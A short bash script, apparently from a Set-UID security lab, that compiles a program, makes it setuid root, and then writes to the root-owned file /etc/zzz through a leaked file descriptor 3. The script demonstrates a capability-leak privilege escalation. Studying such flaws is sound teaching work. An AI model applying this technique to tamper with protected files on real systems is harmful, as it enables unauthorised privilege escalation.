#!/bin/bash
gcc ./leak/leak.c -o ./leak/leak
sudo chown root leak
sudo chmod 4755 leak
ls -l leak
cat /etc/zzz
echo $$
echo bbbbbb > /etc/zzz
./leak
# a new process
# end --> fd erase
echo $$
echo bbbbbbbbbbb >& 3 
cat /etc/zzz